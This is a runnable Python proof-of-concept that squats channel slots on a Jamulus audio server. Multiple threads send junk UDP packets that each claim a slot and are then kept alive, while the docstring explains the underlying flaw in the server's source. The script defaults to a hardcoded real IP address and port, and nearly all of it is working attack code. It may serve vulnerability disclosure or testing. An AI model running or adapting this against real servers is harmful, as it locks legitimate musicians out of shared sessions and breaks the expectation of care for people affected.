#!/usr/bin/env python3
"""
Silent-bot slot-squatting proof of concept.

Sends non-protocol UDP garbage to a Jamulus server to claim channel slots
without completing the audio handshake.  Attack works because:

  - socket.cpp: non-protocol packets bypass protocol parsing → PutAudioData
  - server.cpp PutAudioData: FindChannel(bAllowNew=true) allocates a slot
  - channel.cpp PutAudioData: ResetTimeOutCounter() called even for wrong-sized packets
  - CentralDefenseAllows only fires in the audio path, so the slot is held by
    any IP that isn't already in the block cache
  - getClients returns zero (bots are never identified), but iCurNumChannels is full
  - a real client connecting to a full server gets CLM_SERVER_FULL back

Usage:
  python3 poc-silent-bots.py <host> <port> <num_bots>
  python3 poc-silent-bots.py 178.128.253.5 22224 6

Press Ctrl-C to stop (frees all slots within 30 s).
"""

import socket
import time
import sys
import threading

TARGET_HOST = sys.argv[1] if len(sys.argv) > 1 else "178.128.253.5"
TARGET_PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 22224
NUM_BOTS    = int(sys.argv[3]) if len(sys.argv) > 3 else 6
KEEPALIVE_S = 10   # well under the 30-second channel timeout

# Any bytes that fail CProtocol::ParseMessageFrame are routed to PutAudioData.
# 64 bytes of 0xAA: header would claim 0-length data + 2-byte CRC, but
# total size doesn't match → CRC check fails → falls through to audio path.
JUNK = b'\xaa' * 64

stop_event = threading.Event()

def bot(index: int):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('', 0))
    src_port = sock.getsockname()[1]
    sock.settimeout(1.0)

    sock.sendto(JUNK, (TARGET_HOST, TARGET_PORT))
    print(f"[bot {index:2d}] port {src_port} → slot claimed")

    while not stop_event.is_set():
        time.sleep(KEEPALIVE_S)
        if stop_event.is_set():
            break
        sock.sendto(JUNK, (TARGET_HOST, TARGET_PORT))
        print(f"[bot {index:2d}] keepalive")

    sock.close()
    print(f"[bot {index:2d}] stopped — slot frees after 30 s server-side")


print(f"Target: {TARGET_HOST}:{TARGET_PORT}  bots: {NUM_BOTS}")


threads = []
for i in range(NUM_BOTS):
    t = threading.Thread(target=bot, args=(i,), daemon=True)
    t.start()
    threads.append(t)
    time.sleep(0.05)   # slight stagger so FindChannel doesn't race

print()
print("All bots running.  Server slots are full but getClients returns [].")
print("A 7th connection attempt from any real client will get CLM_SERVER_FULL.")
print()
print("Press Ctrl-C to release slots (real clients can join again after ~30 s).")

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\nStopping bots...")
    stop_event.set()
    for t in threads:
        t.join(timeout=2)
    print("Bots stopped.  Server will free slots within 30 s as timeouts expire.")
